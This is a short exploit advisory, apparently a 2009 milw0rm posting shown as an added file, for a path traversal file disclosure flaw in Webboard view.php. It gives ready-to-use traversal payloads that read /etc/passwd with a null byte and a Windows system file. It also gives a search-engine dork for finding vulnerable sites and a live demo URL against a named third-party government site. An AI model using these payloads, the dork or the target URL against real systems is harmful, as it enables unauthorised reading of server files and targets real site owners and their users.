@@ -1,0 +1,43 @@
+Webboard <= v.2.90 beta Remote File Disclosure Vulnerability
+
+=============================================================
+
+Author: MrDoug
+Email: mrdoug13 [at] gmail [dot] com
+
+Greetz to all my friends
+
+=============================================================
+
+There are 3 vulnerable calls to fopen() in "/webboard/view.php"
+They are on lines 7, 109 and 113.  I have not actually read the
+source but based on tests I would GUESS they look something
+like this...
+
+
+  7: fopen('title/' . $_GET['topic'] . '.txt');
+
+...
+
+109: fopen('counter/read/' . $_GET['topic'] . '.txt');
+
+...
+
+113: fopen('counter/read/' . $_GET['topic'] . '.txt');
+
+
+IMPORTANT:
+Due to the trailing ".txt", retrieving files with different
+extensions will be difficult unless you are able to get a
+null byte through without it being escaped.
+
+=============================================================
+
+Example 1: /webboard/view.php?topic=../../../../../../etc/passwd%00
+Example 2: /webboard/view.php?topic=../../../../../../WINDOWS/system32/eula
+
+Dork: inurl:"webboard/view.php?topic="
+
+Demo: http://korat.nfe.go.th/ksn00/webboard/view.php?topic=../../../../../../WINDOWS/system32/eula
+
+# milw0rm.com [2009-05-29]
